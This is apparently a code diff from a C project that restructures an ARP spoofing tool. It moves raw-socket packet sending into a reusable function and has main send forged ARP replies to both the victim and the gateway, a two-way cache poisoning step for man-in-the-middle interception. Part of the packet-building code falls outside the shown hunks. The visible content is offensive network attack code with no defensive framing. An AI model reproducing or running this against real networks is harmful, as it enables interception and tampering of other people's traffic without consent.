@@ -18,19 +18,7 @@
 
 #define ETH_P_ARP 0x0806
 
-int main(int argc, char* argv[]) {
-
-	char interface[24] = {0};
-	char target_ip[16] = {0};
-	char target_mac[18] = {0};
-	char spoof_ip[16] = {0};
-
-	int result = parse_args(argv, argc, interface, target_ip, target_mac, spoof_ip);
-
-	if(!result) {
-		exit(-1);
-	}
-
+void send_arp_packet(char* interface, char* target_ip, char* target_mac, char* spoof_ip) {
 	int sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
 	if(sock < 0) {
 		perror("while creating raw socket");
@@ -161,4 +149,24 @@ int main(int argc, char* argv[]) {
 	printf("Sent ARP Replay Packet\n");
 
 	close(sock);
+}
+
+int main(int argc, char* argv[]) {
+
+	char interface[24] = {0};
+	char target_ip[16] = {0};
+	char target_mac[18] = {0};
+	char spoof_ip[16] = {0};
+
+	int result = parse_args(argv, argc, interface, target_ip, target_mac, spoof_ip);
+
+	if(!result) {
+		exit(-1);
+	}
+
+	// sending spoof packet to victim
+	send_arp_packet(interface, target_ip, target_mac, spoof_ip);
+
+	// sending spoof packet to gateway
+	send_arp_packet(interface, spoof_ip, target_mac, target_ip);
 }
